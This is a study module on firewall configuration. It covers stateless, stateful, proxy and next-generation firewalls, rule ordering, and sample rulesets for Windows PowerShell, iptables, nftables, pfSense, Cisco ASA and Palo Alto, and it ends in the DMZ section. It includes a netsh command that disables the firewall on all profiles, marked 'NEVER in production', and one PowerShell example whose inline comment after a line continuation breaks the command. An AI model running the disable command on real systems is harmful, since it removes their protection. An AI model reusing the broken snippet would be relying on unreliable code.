---
title: "Module 05 — Firewall Configuration & Rules"
tags: [networking, firewall, iptables, nftables, pfsense, cisco-asa, ngfw, dmz, evasion, pentest, netgod]
module: 5
date: 2026-04-05
---

# Module 05 — Firewall Configuration & Rules

> [!info] Module Overview
> This module covers every firewall type from packet filter to NGFW — how each processes traffic, how rules are written and ordered, and how attackers evade them. Full production rule sets for Windows Firewall (PowerShell), Linux iptables, Linux nftables, Cisco ASA, and Palo Alto NGFW overview. DMZ architectures, dual-firewall design, and a complete Pentest Lens covering fingerprinting, evasion, and enumeration through firewall policy.

---

## 1. Firewall Types

### Packet Filter Firewall (Stateless)

The simplest firewall type. Inspects each packet in isolation against a rule set — source IP, destination IP, source port, destination port, protocol. Makes no judgment about whether a packet belongs to an established connection.

**How it works**:
```
Packet arrives → Check rules top-to-bottom → First match wins → Permit or Deny
If no rule matches → Implicit deny (good) or implicit permit (bad — never do this)
```

**Limitations**:
- No state tracking — cannot distinguish a reply packet from an attack packet with the same header values
- To permit return traffic, you must explicitly allow the reply direction, which means allowing inbound traffic on high ports — attackers can exploit this
- Vulnerable to IP spoofing (cannot verify if source IP is real)
- Cannot inspect application layer content

**Where still used**: Router ACLs (Cisco IOS `access-list`), simple cloud security groups, first-hop filtering.

### Stateful Firewall

A stateful firewall maintains a **connection state table** (also called the state table or connection tracking table). It tracks:
- Source IP, Destination IP
- Source Port, Destination Port
- Protocol
- Connection state (SYN_SENT, ESTABLISHED, FIN_WAIT, etc.)
- Session timeout

**How it works**:
```
Outbound SYN arrives → No rule violation → Create state table entry → Forward packet
Inbound SYN-ACK arrives → Check state table → Matches existing entry → Forward (automatically permitted)
Inbound packet with no matching state entry → DROP (no rule needed to block this)
```

This means you only need to write rules for **initiating** traffic. Return traffic is automatically permitted because it matches an established session in the state table.

**Limitations**:
- State table can be exhausted (SYN flood — huge number of half-open connections fill the table)
- Cannot inspect application-layer content (an attacker can tunnel arbitrary data over TCP 80 — stateful firewall sees it as valid HTTP)
- Doesn't detect attacks within allowed sessions

**Where used**: Most enterprise firewalls (Cisco ASA, pfSense, Windows Firewall with Advanced Security).

### Application-Layer Proxy Firewall

Operates as a **full proxy** — the client connects to the firewall, the firewall inspects and re-creates the application-layer conversation, then connects to the server on behalf of the client. The server never communicates directly with the client.

**How it works**:
```
Client → [TCP connect to proxy] → Proxy inspects application data → [New TCP connect to server] → Server
```

**Capabilities**:
- Full application-layer inspection (HTTP headers, DNS queries, SMTP commands)
- Can block specific URLs, file types, malicious payloads within allowed protocols
- Can enforce authentication at the proxy (all users must authenticate to browse the web)
- SSL/TLS inspection (proxy terminates TLS, inspects content, re-encrypts)

**Limitations**:
- Higher latency (full proxy = more processing)
- Not transparent — applications must be configured to use the proxy (explicit proxy) or traffic must be transparently redirected (transparent proxy)
- SSL inspection breaks end-to-end encryption and requires deploying the proxy's CA certificate to all clients

**Examples**: Squid, Blue Coat, Zscaler, Cisco Web Security Appliance

### NGFW — Next-Generation Firewall

NGFW combines stateful inspection with:
- **Deep Packet Inspection (DPI)**: Inspect application-layer content even within encrypted or non-standard traffic
- **App-ID / Application awareness**: Identify applications regardless of port (e.g., identify Facebook traffic on any port, not just TCP 443)
- **User-ID**: Associate traffic with specific users (integrated with Active Directory)
- **IPS (Intrusion Prevention System)**: Inline threat detection and blocking
- **URL filtering**: Block categories of websites
- **SSL/TLS decryption**: Inspect encrypted traffic
- **Threat intelligence integration**: Block known malicious IPs/domains/file hashes

**Examples**: Palo Alto Networks, Fortinet FortiGate, Check Point, Cisco Firepower, Sophos XG

---

## 2. Rule Logic — Top-Down Processing, Implicit Deny, Rule Ordering

### Top-Down Processing

Firewalls process rules in order from top to bottom. The **first matching rule wins** — subsequent rules are not evaluated.

```
Rule 1: DENY  source=10.10.10.5  dest=any  port=any
Rule 2: ALLOW source=10.10.10.0/24  dest=192.168.1.10  port=443
Rule 3: DENY  source=any  dest=any  port=any  (implicit deny)

Packet from 10.10.10.5 to 192.168.1.10:443:
→ Matches Rule 1 (DENY) → Dropped. Rule 2 never evaluated.

Packet from 10.10.10.6 to 192.168.1.10:443:
→ No match on Rule 1 (source doesn't match)
→ Matches Rule 2 (ALLOW) → Permitted.

Packet from 10.10.10.6 to 192.168.1.10:80:
→ No match Rule 1, No match Rule 2 (port 80 ≠ 443)
→ Matches Rule 3 (implicit deny) → Dropped.
```

### Implicit Deny

Every properly configured firewall has an implicit deny at the bottom — **all traffic not explicitly permitted is denied**. This is also called "default deny" or "deny all."

> [!danger] Never Use Implicit Permit
> Some older or misconfigured firewalls use implicit permit — all traffic not explicitly denied is allowed. This is the opposite of what you want. A single missed deny rule exposes everything. Always: deny all, permit by exception.

### Rule Ordering Best Practices

1. **Most specific rules first**: `DENY 10.10.10.5/32` before `ALLOW 10.10.10.0/24`
2. **Most frequently matched rules near the top**: Reduces processing overhead
3. **Group related rules**: All rules for a service together with a comment
4. **Deny rules before their exception's permit rule**: Block a subnet, then allow specific IPs within it
5. **Cleanup rule** (explicit deny-all with logging): At the bottom — logs all traffic hitting implicit deny, useful for troubleshooting and detecting attacks

### Stateful Rule Design

With a stateful firewall, you typically only need **outbound permit rules** — return traffic is automatically permitted by the state table.

```
Outbound rules (internal → internet):
ALLOW  src=192.168.1.0/24  dst=any  port=80   (HTTP)
ALLOW  src=192.168.1.0/24  dst=any  port=443  (HTTPS)
ALLOW  src=192.168.1.0/24  dst=8.8.8.8  port=53  (DNS to Google)
DENY   src=any  dst=any  port=any  (implicit deny)

No inbound rules needed for return traffic — state table handles it.
Inbound rules only needed for services you're hosting (web server, RDP, etc.)
```

---

## 3. Windows Firewall — GUI and PowerShell

### Windows Firewall Architecture

Windows Firewall with Advanced Security (WFAS) is a **stateful host-based firewall** built into Windows. It processes rules in this order:
1. Windows Filtering Platform (WFP) kernel driver
2. Inbound rules (evaluated for incoming connections)
3. Outbound rules (evaluated for outgoing connections)
4. Connection security rules (IPsec policies)

Three profiles — each can have different rules:
- **Domain**: Active when the machine is connected to a domain network (DC reachable)
- **Private**: Active when connected to a trusted private network
- **Public**: Active when connected to an untrusted network (coffee shop Wi-Fi)

### PowerShell Firewall Management

```powershell
# View all firewall rules
Get-NetFirewallRule | Format-Table Name, Enabled, Direction, Action, DisplayName

# View rules with port details
Get-NetFirewallRule -Enabled True | Get-NetFirewallPortFilter | 
  Select-Object -Property * | Format-Table

# View specific rule
Get-NetFirewallRule -DisplayName "Remote Desktop*"

# Enable/Disable Windows Firewall per profile
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True
Set-NetFirewallProfile -Profile Public -Enabled True -DefaultInboundAction Block -DefaultOutboundAction Allow

# Show firewall profile settings
Get-NetFirewallProfile

# ─── CREATING RULES ───────────────────────────────────────────────────────────

# Allow inbound SSH (TCP 22) from specific subnet
New-NetFirewallRule `
  -DisplayName "Allow SSH from Management" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 22 `
  -RemoteAddress 10.0.100.0/24 `
  -Profile Domain,Private `
  -Enabled True

# Allow inbound HTTP and HTTPS (web server)
New-NetFirewallRule `
  -DisplayName "Allow HTTP Inbound" `
  -Direction Inbound -Action Allow `
  -Protocol TCP -LocalPort 80 -Enabled True

New-NetFirewallRule `
  -DisplayName "Allow HTTPS Inbound" `
  -Direction Inbound -Action Allow `
  -Protocol TCP -LocalPort 443 -Enabled True

# Block outbound to specific IP (C2 block)
New-NetFirewallRule `
  -DisplayName "Block Malicious IP" `
  -Direction Outbound `
  -Action Block `
  -RemoteAddress 185.220.101.50 `
  -Enabled True

# Block all outbound except specific ports (application whitelist approach)
Set-NetFirewallProfile -Profile Domain -DefaultOutboundAction Block

New-NetFirewallRule -DisplayName "Allow DNS Outbound" `
  -Direction Outbound -Action Allow -Protocol UDP -RemotePort 53

New-NetFirewallRule -DisplayName "Allow HTTP/S Outbound" `
  -Direction Outbound -Action Allow -Protocol TCP -RemotePort 80,443

New-NetFirewallRule -DisplayName "Allow NTP Outbound" `
  -Direction Outbound -Action Allow -Protocol UDP -RemotePort 123

# Allow ICMP (ping) inbound
New-NetFirewallRule `
  -DisplayName "Allow ICMPv4 Inbound" `
  -Direction Inbound -Action Allow `
  -Protocol ICMPv4 -IcmpType 8 `    # Type 8 = Echo Request
  -Enabled True

# ─── MODIFYING AND REMOVING RULES ────────────────────────────────────────────

# Disable a rule (keep it, just deactivate)
Set-NetFirewallRule -DisplayName "Allow SSH from Management" -Enabled False

# Delete a rule
Remove-NetFirewallRule -DisplayName "Allow SSH from Management"

# ─── LOGGING ─────────────────────────────────────────────────────────────────

# Enable firewall logging
Set-NetFirewallProfile -Profile Domain -LogFileName "C:\Windows\System32\LogFiles\Firewall\pfirewall.log" `
  -LogMaxSizeKilobytes 32768 `
  -LogAllowed True `
  -LogBlocked True

# ─── NETSH (LEGACY BUT STILL USED) ────────────────────────────────────────────

# Show all rules
netsh advfirewall firewall show rule name=all

# Add allow rule
netsh advfirewall firewall add rule name="Allow RDP" protocol=TCP dir=in localport=3389 action=allow

# Delete rule
netsh advfirewall firewall delete rule name="Allow RDP"

# Enable/disable firewall
netsh advfirewall set allprofiles state on
netsh advfirewall set allprofiles state off    # NEVER in production
```

### Windows Firewall — Hardening Baseline

```powershell
# Block all inbound by default, all profiles
Set-NetFirewallProfile -Profile Domain,Private,Public `
  -DefaultInboundAction Block `
  -DefaultOutboundAction Allow `
  -NotifyOnListen False

# Allow only required inbound services:
# Domain controllers need many ports — workstations need fewer

# Workstation baseline — allow:
$rules = @(
  @{Name="Allow RDP Inbound Management"; Port=3389; Remote="10.0.100.0/24"},
  @{Name="Allow WinRM HTTPS Inbound"; Port=5986; Remote="10.0.100.0/24"},
  @{Name="Allow ICMP Inbound"; Protocol="ICMPv4"}
)
foreach ($r in $rules) {
  if ($r.Protocol -eq "ICMPv4") {
    New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Action Allow -Protocol ICMPv4
  } else {
    New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Action Allow `
      -Protocol TCP -LocalPort $r.Port -RemoteAddress $r.Remote
  }
}
```

---

## 4. Linux iptables — Full Production Treatment

### iptables Architecture — Tables and Chains

iptables operates on **tables**, each containing **chains** of rules. Packets traverse chains depending on their type (inbound/outbound/forwarded).

**Four tables**:
| Table | Purpose | Default Chains |
|-------|---------|---------------|
| filter | Default — permit/deny decisions | INPUT, FORWARD, OUTPUT |
| nat | Address translation (SNAT/DNAT/MASQUERADE) | PREROUTING, POSTROUTING, OUTPUT |
| mangle | Packet modification (TTL, ToS, mark) | All five chains |
| raw | Connection tracking exemptions | PREROUTING, OUTPUT |

**Five built-in chains**:
| Chain | Processes |
|-------|-----------|
| PREROUTING | All packets immediately on arrival, before routing decision |
| INPUT | Packets destined for the local machine |
| FORWARD | Packets being routed through the machine (not for local) |
| OUTPUT | Packets originating from the local machine |
| POSTROUTING | All packets after routing decision, just before leaving |

### Packet Flow Through iptables

```
Packet arrives on interface
         │
         ▼
  ┌─────────────────┐
  │  PREROUTING     │  mangle → nat (DNAT here)
  │  (raw → mangle → nat)
  └────────┬────────┘
           │
    Routing decision
    /              \
   /                \
For local host    For forwarding
   │                   │
   ▼                   ▼
┌──────────┐    ┌──────────────┐
│  INPUT   │    │   FORWARD    │
│ (filter) │    │  (filter)    │
└────┬─────┘    └──────┬───────┘
     │                 │
     ▼                 │
Local process          │
     │                 │
     ▼                 ▼
┌──────────┐    ┌─────────────────┐
│  OUTPUT  │    │  POSTROUTING    │
│ (filter) │    │ mangle → nat    │
└────┬─────┘    │ (SNAT/MASQ here)│
     │          └────────┬────────┘
     └──────────────────┘
                         │
              Packet leaves interface
```

### Core iptables Syntax

```bash
iptables [-t table] COMMAND chain [match criteria] [-j target]

# Tables: -t filter (default), -t nat, -t mangle, -t raw
# Commands:
#   -A chain    Append rule to end of chain
#   -I chain N  Insert rule at position N (default: top)
#   -D chain N  Delete rule at position N
#   -R chain N  Replace rule at position N
#   -L          List rules
#   -F          Flush (delete) all rules in chain
#   -P chain target  Set default policy (ACCEPT or DROP)
#   -n          Numeric output (don't resolve IPs/ports)
#   -v          Verbose (show packet/byte counts, interface)
#   --line-numbers  Show rule numbers

# Targets (what to do when rule matches):
#   ACCEPT      Allow the packet
#   DROP        Silently discard the packet (sender gets no response)
#   REJECT      Discard and send error back (--reject-with icmp-port-unreachable)
#   LOG         Log to syslog then continue processing
#   MASQUERADE  SNAT to the outgoing interface IP (dynamic — use for DHCP interfaces)
#   SNAT        Static source NAT (use for static public IPs)
#   DNAT        Destination NAT (port forwarding)
#   RETURN      Stop traversing current chain, return to calling chain
```

### Viewing Rules

```bash
# List filter table rules (verbose, numeric, with line numbers)
iptables -L -v -n --line-numbers

# List specific chain
iptables -L INPUT -v -n --line-numbers

# List NAT table
iptables -t nat -L -v -n --line-numbers

# Show rule counts (useful to verify rules are matching)
iptables -L INPUT -v -n    # Packets and bytes columns show hit counts

# Example output:
# Chain INPUT (policy DROP 0 packets, 0 bytes)
# num  pkts bytes target  prot opt  in   out  source      destination
#   1   142  9832 ACCEPT  all  --   lo   any  anywhere    anywhere           # loopback
#   2  1234  65K  ACCEPT  all  --   any  any  anywhere    anywhere  ctstate RELATED,ESTABLISHED
#   3     5   300 ACCEPT  tcp  --   any  any  10.0.100.0/24  anywhere  tcp dpt:22
#   4     0     0 LOG     all  --   any  any  anywhere    anywhere  LOG level warning prefix "DROPPED: "
#   5     0     0 DROP    all  --   any  any  anywhere    anywhere
```

### Production iptables Ruleset — Linux Server

```bash
#!/bin/bash
# Hardened iptables ruleset for a Linux web server
# Run as root

IPT="iptables"
MGMT_NET="10.0.100.0/24"      # Management network — SSH allowed from here
WEB_ALLOWED="0.0.0.0/0"       # Public web traffic

# ─── STEP 1: FLUSH EXISTING RULES AND SET DEFAULTS ───────────────────────────
$IPT -F             # Flush all filter rules
$IPT -X             # Delete user-defined chains
$IPT -t nat -F      # Flush NAT rules
$IPT -t mangle -F   # Flush mangle rules

# Set default policies — DROP everything not explicitly allowed
$IPT -P INPUT DROP
$IPT -P FORWARD DROP
$IPT -P OUTPUT ACCEPT    # Allow all outbound (tighten this in high-security environments)

# ─── STEP 2: ALLOW LOOPBACK ───────────────────────────────────────────────────
$IPT -A INPUT -i lo -j ACCEPT
$IPT -A OUTPUT -o lo -j ACCEPT

# ─── STEP 3: ALLOW ESTABLISHED/RELATED CONNECTIONS ───────────────────────────
# This is the key stateful rule — allows return traffic for outbound connections
$IPT -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# ─── STEP 4: DROP INVALID PACKETS ─────────────────────────────────────────────
# Invalid = not matching any known connection state
$IPT -A INPUT -m conntrack --ctstate INVALID -j DROP

# ─── STEP 5: ICMP — ALLOW USEFUL TYPES, RATE LIMIT PING ──────────────────────
# Allow ICMP Echo Reply (we get these back when we ping something)
$IPT -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT
# Allow ICMP unreachable (needed for PMTUD — Path MTU Discovery)
$IPT -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPT
# Allow ICMP time-exceeded (needed for traceroute)
$IPT -A INPUT -p icmp --icmp-type time-exceeded -j ACCEPT
# Allow ping (echo-request) from management only, rate-limited
$IPT -A INPUT -p icmp --icmp-type echo-request -s $MGMT_NET -m limit --limit 5/s --limit-burst 10 -j ACCEPT

# ─── STEP 6: SSH — MANAGEMENT NETWORK ONLY ───────────────────────────────────
$IPT -A INPUT -p tcp --dport 22 -s $MGMT_NET -m conntrack --ctstate NEW -j ACCEPT
# Rate limit new SSH connections to prevent brute force
$IPT -A INPUT -p tcp --dport 22 -m recent --name SSH --set
$IPT -A INPUT -p tcp --dport 22 -m recent --name SSH --rcheck --seconds 60 --hitcount 4 -j DROP

# ─── STEP 7: WEB TRAFFIC ──────────────────────────────────────────────────────
$IPT -A INPUT -p tcp --dport 80 -s $WEB_ALLOWED -m conntrack --ctstate NEW -j ACCEPT
$IPT -A INPUT -p tcp --dport 443 -s $WEB_ALLOWED -m conntrack --ctstate NEW -j ACCEPT

# ─── STEP 8: BLOCK SPECIFIC KNOWN BAD (example) ──────────────────────────────
$IPT -I INPUT 1 -s 185.220.101.0/24 -j DROP    # Insert at top (position 1)

# ─── STEP 9: SYN FLOOD PROTECTION ────────────────────────────────────────────
$IPT -A INPUT -p tcp --syn -m limit --limit 25/s --limit-burst 50 -j ACCEPT
$IPT -A INPUT -p tcp --syn -j DROP

# ─── STEP 10: LOG AND DROP EVERYTHING ELSE ───────────────────────────────────
$IPT -A INPUT -m limit --limit 5/min -j LOG --log-prefix "IPT_DROP: " --log-level 4
$IPT -A INPUT -j DROP

echo "iptables rules applied."
```

### Connection Tracking States

The `-m conntrack --ctstate` match is the core of stateful iptables. States:

| State | Meaning |
|-------|---------|
| NEW | First packet of a new connection (SYN for TCP) |
| ESTABLISHED | Packet belongs to an established connection |
| RELATED | Related to an existing connection (FTP data, ICMP error for existing TCP) |
| INVALID | Packet doesn't match any known connection state |
| UNTRACKED | Packet explicitly excluded from tracking (via raw table) |

### NAT with iptables

```bash
# ─── MASQUERADE (Source NAT — dynamic, for DHCP interfaces) ──────────────────
# Enable IP forwarding (required for NAT/routing)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Masquerade all traffic leaving eth0 (internet-facing interface)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# ─── SNAT (Static source NAT — for fixed public IPs) ─────────────────────────
iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j SNAT --to-source 203.0.113.1

# ─── DNAT (Destination NAT — Port Forwarding) ─────────────────────────────────
# Forward incoming TCP 80 to internal web server 192.168.1.10:80
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.10:80
# Also need to FORWARD the packet (filter table)
iptables -A FORWARD -p tcp -d 192.168.1.10 --dport 80 -j ACCEPT

# Forward incoming TCP 2222 to internal SSH server 192.168.1.20:22
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 2222 -j DNAT --to-destination 192.168.1.20:22
iptables -A FORWARD -p tcp -d 192.168.1.20 --dport 22 -j ACCEPT
```

### Saving and Restoring iptables Rules

```bash
# Debian/Ubuntu
apt install iptables-persistent
iptables-save > /etc/iptables/rules.v4
ip6tables-save > /etc/iptables/rules.v6
# Rules automatically loaded on boot by netfilter-persistent

# RHEL/CentOS
service iptables save      # Saves to /etc/sysconfig/iptables
systemctl enable iptables  # Load on boot

# Manual save/restore
iptables-save > /root/iptables.backup
iptables-restore < /root/iptables.backup
```

---

## 5. Linux nftables

nftables is the modern replacement for iptables (and ip6tables, arptables, ebtables — all unified). It uses a cleaner syntax and is more efficient.

### nftables vs iptables Key Differences

| Feature | iptables | nftables |
|---------|---------|---------|
| Syntax | Separate commands per rule | Declarative — define entire ruleset in file |
| IPv4/IPv6 | Separate (iptables/ip6tables) | Unified in same ruleset |
| Performance | Linear rule scan | Uses hash maps for IP matching — faster |
| Set support | Limited | Native sets — match against many IPs/ports efficiently |
| Default on | Older distros | Ubuntu 20.04+, Debian 10+, RHEL 8+ |

### nftables Core Concepts

- **Table**: Named container with address family (ip, ip6, inet, arp, bridge, netdev)
- **Chain**: Ordered set of rules within a table. Has a type (filter/nat/route), hook (prerouting/input/forward/output/postrouting), and priority.
- **Rule**: Match criteria + action (accept, drop, reject, log, jump, return)
- **Set**: A collection of addresses, ports, or other values — used for efficient multi-value matching

### nftables Syntax

```bash
# Show current ruleset
nft list ruleset

# Flush entire ruleset
nft flush ruleset

# Load from file
nft -f /etc/nftables.conf
```

### Production nftables Ruleset

```nft
#!/usr/sbin/nft -f
# /etc/nftables.conf — hardened server ruleset

flush ruleset

# ── Single inet table handles both IPv4 and IPv6 ─────────────────────────────
table inet filter {

    # ── Sets — named collections for efficient matching ───────────────────────
    set mgmt_nets {
        type ipv4_addr
        flags interval
        elements = { 10.0.100.0/24, 192.168.100.0/24 }
    }

    set blocked_ips {
        type ipv4_addr
        flags interval
        elements = { 185.220.101.0/24, 198.96.155.0/24 }
    }

    # ── INPUT chain ───────────────────────────────────────────────────────────
    chain input {
        type filter hook input priority 0; policy drop;    # Default: drop all

        # Loopback — always allow
        iif lo accept

        # Drop invalid connection states
        ct state invalid drop

        # Allow established/related (stateful — return traffic)
        ct state { established, related } accept

        # Drop blocked IPs (check set)
        ip saddr @blocked_ips drop

        # ICMP — allow useful types
        ip protocol icmp icmp type { echo-reply, destination-unreachable, time-exceeded } accept
        ip protocol icmp icmp type echo-request limit rate 5/second burst 10 packets accept
        ip6 nexthdr icmpv6 icmpv6 type { echo-reply, destination-unreachable, time-exceeded,
            nd-neighbor-solicit, nd-router-advert, nd-neighbor-advert } accept

        # SSH — management networks only, rate limited
        tcp dport 22 ip saddr @mgmt_nets ct state new limit rate 4/minute accept
        tcp dport 22 ct state new drop    # Drop SSH from non-management

        # Web server
        tcp dport { 80, 443 } ct state new accept

        # Log everything else before dropping
        limit rate 5/minute log prefix "nft_drop: " level warn
        drop
    }

    # ── FORWARD chain ─────────────────────────────────────────────────────────
    chain forward {
        type filter hook forward priority 0; policy drop;
        # By default forward nothing — add rules if this is a router/firewall
    }

    # ── OUTPUT chain ──────────────────────────────────────────────────────────
    chain output {
        type filter hook output priority 0; policy accept;
        # Allow all outbound (tighten for high-security environments)
    }
}

# ── NAT table ─────────────────────────────────────────────────────────────────
table ip nat {
    chain prerouting {
        type nat hook prerouting priority -100;
        # Port forwarding: TCP 8080 → internal 192.168.1.10:80
        tcp dport 8080 dnat to 192.168.1.10:80
    }

    chain postrouting {
        type nat hook postrouting priority 100;
        # Masquerade all traffic leaving eth0
        oif eth0 masquerade
    }
}
```

```bash
# Apply the ruleset
nft -f /etc/nftables.conf

# Verify
nft list ruleset
nft list table inet filter

# Add a rule interactively (without editing the file)
nft add rule inet filter input tcp dport 8443 ct state new accept

# Add an IP to the blocked set dynamically
nft add element inet filter blocked_ips { 1.2.3.4 }

# Enable nftables on boot
systemctl enable nftables
systemctl start nftables
```

---

## 6. pfSense / OPNsense Overview

pfSense and OPNsense are open-source firewall/router distributions based on FreeBSD. Used widely in SMBs, labs, and as edge firewalls.

### Architecture

- **Interfaces**: WAN (untrusted), LAN (trusted), DMZ (optional OPT interfaces), VLAN interfaces
- **Rules**: Applied per interface, evaluated on incoming traffic only
- **State table**: FreeBSD pf (packet filter) — tracks connection state
- **NAT**: Outbound NAT (MASQUERADE equivalent), Port Forwards (inbound DNAT)

### Key pfSense Concepts

**Interface rules are evaluated on inbound traffic**:
- Rules on the **WAN interface** control traffic coming in from the internet
- Rules on the **LAN interface** control traffic coming in from the LAN (going out to internet or DMZ)

**Default rules**:
- WAN: Block all inbound by default (implicit deny)
- LAN: Allow all outbound by default (any → any allow rule) — **change this in production**

### pfSense Firewall Rule Fields

```
Interface:      LAN (which interface this rule applies to)
Action:         Pass / Block / Reject
Address Family: IPv4 / IPv6 / IPv4+IPv6
Protocol:       TCP / UDP / TCP+UDP / ICMP / any
Source:         network, host, alias, or "any"
Destination:    network, host, alias, or "any"
Destination Port: port number or alias
Log:            checkbox — log matching traffic
Description:    human-readable rule description
```

### pfSense Aliases

Aliases are named groups of IPs, networks, or ports — make rules readable and maintainable.

```
Alias: MGMT_HOSTS  → 192.168.100.10, 192.168.100.11
Alias: WEB_PORTS   → 80, 443, 8080, 8443
Alias: RFC1918     → 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

Rule: Allow  source=MGMT_HOSTS  dest=any  port=WEB_PORTS
```

### Basic pfSense DMZ Setup

```
WAN (203.0.113.1) ──── pfSense ──── LAN (192.168.1.1/24)
                           │
                        DMZ (10.10.10.1/24)
                           │
                       Web Server (10.10.10.10)

Rules:
  WAN → DMZ: Allow TCP 80,443 destination 10.10.10.10 only
  DMZ → LAN: Block (DMZ should not initiate connections to LAN)
  LAN → DMZ: Allow (internal users can reach DMZ web servers)
  LAN → WAN: Allow (internet access)
  DMZ → WAN: Allow TCP 80,443 (web server needs outbound for updates — restrict tightly)
```

---

## 7. Cisco ASA — Access Lists, Security Levels, NAT, Inspection

### Security Levels

Every ASA interface has a **security level** from 0 (least trusted) to 100 (most trusted).

| Interface | Default Security Level | Network |
|-----------|----------------------|---------|
| outside | 0 | Internet / WAN |
| dmz | 50 (configurable) | DMZ |
| inside | 100 | Internal LAN |

**Default behaviour** (without explicit ACLs):
- Traffic can flow from **higher to lower** security level (inside → outside) without explicit permit
- Traffic cannot flow from **lower to higher** security level (outside → inside) without explicit permit
- Between interfaces with the **same security level**: blocked by default

### ASA ACL Configuration

ACLs on the ASA use **named ACLs** applied to interfaces in a specific direction.

```cisco
! ─── CREATE NAMED ACCESS LISTS ──────────────────────────────────────────────

! Inbound ACL on outside interface — what internet can send in
access-list OUTSIDE_IN extended permit tcp any host 203.0.113.10 eq 80
access-list OUTSIDE_IN extended permit tcp any host 203.0.113.10 eq 443
access-list OUTSIDE_IN extended deny ip any any log

! Inbound ACL on DMZ interface — what DMZ can send into inside
access-list DMZ_IN extended deny ip 10.10.10.0 255.255.255.0 192.168.1.0 255.255.255.0
access-list DMZ_IN extended permit tcp 10.10.10.0 255.255.255.0 any eq 80
access-list DMZ_IN extended permit tcp 10.10.10.0 255.255.255.0 any eq 443
access-list DMZ_IN extended permit udp 10.10.10.0 255.255.255.0 host 8.8.8.8 eq 53
access-list DMZ_IN extended deny ip any any log

! ─── APPLY ACLs TO INTERFACES ───────────────────────────────────────────────
access-group OUTSIDE_IN in interface outside
access-group DMZ_IN in interface dmz

! ─── VERIFY ─────────────────────────────────────────────────────────────────
show access-list OUTSIDE_IN
show access-list OUTSIDE_IN element 1    ! Show hit counts for specific ACE
show run access-group
```

### ASA NAT Configuration (ASA 8.3+)

ASA 8.3 changed NAT syntax significantly. All NAT is now in a unified NAT table.

```cisco
! ─── OBJECT DEFINITIONS ─────────────────────────────────────────────────────

! Define internal web server
object network WEB_SERVER
 host 192.168.1.10
 description "Internal Web Server"

! Define public IP for the web server
object network WEB_SERVER_PUBLIC
 host 203.0.113.10

! ─── STATIC NAT (one-to-one: public IP → internal server) ───────────────────
! Maps 203.0.113.10 to 192.168.1.10 bidirectionally
nat (inside,outside) source static WEB_SERVER WEB_SERVER_PUBLIC

! ─── DYNAMIC PAT (many-to-one: inside → internet via single public IP) ───────
! All inside hosts appear as 203.0.113.1 when going to outside
object network INSIDE_NET
 subnet 192.168.1.0 255.255.255.0

nat (inside,outside) dynamic interface    ! Use the outside interface IP

! ─── PORT FORWARDING (Static PAT) ────────────────────────────────────────────
! Forward outside TCP 3389 to internal RDP server
object network RDP_SERVER
 host 192.168.1.20

object service RDP
 service tcp destination eq 3389

nat (inside,outside) source static RDP_SERVER interface service RDP RDP

! ─── VERIFY ─────────────────────────────────────────────────────────────────
show nat
show nat detail
show xlate        ! Active NAT translations
show conn         ! Active connections through ASA
```

### ASA Service Policy (Inspection)

The ASA uses a **modular policy framework** to apply deep inspection to traffic:

```cisco
! Default inspection policy (usually pre-configured)
class-map inspection_default
 match default-inspection-traffic

policy-map global_policy
 class inspection_default
  inspect dns                    ! DNS inspection (prevents DNS spoofing)
  inspect ftp                    ! FTP — fixes active/passive mode through NAT
  inspect http                   ! HTTP inspection (URL filtering if licensed)
  inspect icmp                   ! ICMP stateful tracking
  inspect sip                    ! SIP VoIP inspection
  inspect skinny                 ! SCCP (Cisco phones)
  inspect esmtp                  ! SMTP/ESMTP inspection

! Apply globally (to all interfaces)
service-policy global_policy global

! Verify
show service-policy
show conn detail
```

### ASA Verification Commands

```cisco
show interface ip brief          ! All interfaces and IPs
show ip route                    ! Routing table
show access-list                 ! All ACLs with hit counts
show nat                         ! NAT rules
show xlate                       ! Active translations
show conn                        ! Active connections
show threat-detection statistics ! If threat detection enabled
show logging                     ! Firewall logs
```

---

## 8. Palo Alto NGFW — Overview

Palo Alto Networks NGFW uses a **single-pass parallel processing** architecture and identifies applications before applying policy.

### Key Differentiators

**App-ID**: Identifies the application regardless of port. Traffic on TCP 443 might be identified as Salesforce, Zoom, Netflix, or custom-app — enabling policy based on application, not just port.

**User-ID**: Maps IP addresses to usernames (via AD integration, Captive Portal, or agent). Policies can be written as "Allow Engineering group to access GitHub" — not just "Allow 192.168.10.0/24 to 140.82.0.0/14:443".

**Content-ID**: IPS signatures, URL filtering, file blocking, WildFire sandboxing — all inline.

### Security Policy Structure

```
Rule Name:          Allow-Web-Browsing
Source Zone:        Trust (internal users)
Source Address:     any
Source User:        domain\developers (User-ID)
Destination Zone:   Untrust (internet)
Destination Address: any
Application:        web-browsing, ssl, google-base, github
Service:            application-default (use the app's default port)
Action:             Allow
Profile Group:      Strict-Security (IPS + URL filter + antivirus)
Log at Session End: Yes
```

### Palo Alto Zones

```
Zones replace simple interface trust levels:
  - L3 Zone "Trust"     → internal interfaces
  - L3 Zone "Untrust"   → WAN interface
  - L3 Zone "DMZ"       → DMZ interface
  - L3 Zone "Management" → management interface

Security policies control traffic between zones.
Traffic within the same zone is allowed by default.
Traffic between zones requires an explicit policy rule.
```

### Palo Alto Verification (CLI)

```bash
# Show security policy
show security policy-statistics

# Show active sessions
show session all
show session id <session-id>

# Show App-ID application identification
show application | match <app-name>

# Show threat logs
show log threat
show log traffic
```

---

## 9. DMZ Architectures

### Single Firewall DMZ

One firewall with three interfaces: WAN, LAN, DMZ.

```
Internet
    │
    ▼
┌───────────────────────────────┐
│         FIREWALL              │
│  ┌──────┐ ┌────┐ ┌─────────┐ │
│  │ WAN  │ │LAN │ │  DMZ   │ │
│  │ eth0 │ │eth1│ │  eth2  │ │
└──┴──────┴─┴────┴─┴─────────┴─┘
                │           │
           [Internal]   [Web Server]
                         [Mail Relay]
                         [VPN Gateway]
```

